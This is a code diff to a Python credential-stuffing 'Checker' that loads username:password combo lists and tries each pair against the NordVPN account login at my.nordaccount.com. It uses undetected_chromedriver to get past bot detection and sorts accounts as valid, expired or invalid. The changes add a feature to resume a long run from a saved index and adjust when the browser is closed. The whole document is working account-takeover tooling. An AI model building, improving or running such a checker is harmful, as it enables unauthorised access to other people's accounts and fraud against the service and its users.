@@ -1,9 +1,8 @@
 import time
-import requests
+import os
 import undetected_chromedriver as stealthdriver
 from pathlib import Path
 from selenium.common.exceptions import NoSuchElementException
-from selenium.common.exceptions import WebDriverException
 from selenium.webdriver.common.by import By
 
 
@@ -31,6 +30,15 @@ class Checker:
                 self.users.append(i.split(":")[0])
                 self.passwords.append(i.split(":")[1].split(" ")[0].replace("\n", ""))
         combos.close()
+        for i in os.listdir():
+            if "resume_from_index" in i:
+                print("Resume file found...")
+                index = open("resume_from_index",'r').readlines()[0]
+                counter = 0
+                while counter < int(index):
+                    self.users.pop(0)
+                    self.passwords.pop(0)
+                    counter += 1
         return len(self.users)
 
     def start(self, counter):
@@ -53,11 +61,10 @@ class Checker:
             time.sleep(0.8)
             password_button.click()
             time.sleep(3)
-            self.browser.close()
         except NoSuchElementException:
             print(" - No such Element - Retrying")
+            self.browser.close()
             return 1
-
         if "https://my.nordaccount.com/dashboard/" in self.browser.current_url:
             self.browser.get(self.account_page)
             time.sleep(4)
@@ -71,5 +78,4 @@ class Checker:
                     print(" ---> Expired".format(self.users[counter], self.passwords[counter]))
         else:
             print(" ---> Invalid Account".format(self.users[counter], self.passwords[counter]))
-
         self.browser.close()
